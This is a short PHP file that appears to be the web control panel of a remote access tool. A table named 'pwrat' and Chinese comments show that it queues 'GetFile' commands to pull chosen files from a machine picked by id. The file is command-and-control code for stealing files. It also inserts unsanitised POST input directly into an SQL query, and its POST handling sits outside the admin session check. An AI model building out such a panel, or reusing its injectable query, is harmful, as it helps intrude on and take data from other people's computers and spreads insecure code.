<?php
require("dbconn.php");

//将需要获取的文件路径插入数据库
if(($_POST["id"] != NULL) && ($_POST["file"] != NULL))
{
	$file = $_POST["file"];
	$id = $_POST["id"];
	$mysqli->query("UPDATE pwrat SET cmd='GetFile'.'$file' WHERE id='$id'");
}

//获得上传来的文件

//如果文件存在则输出

if (isset($_SESSION["admin"]))
{
	echo '<div id="console"><form action="files.php" method="post">
	File Path: <input type="text" name="file" />&nbspid:<input type="number" name="id" />
	<input type="submit" value="Get File">
	</form></div>';
}

$mysqli->close();
?>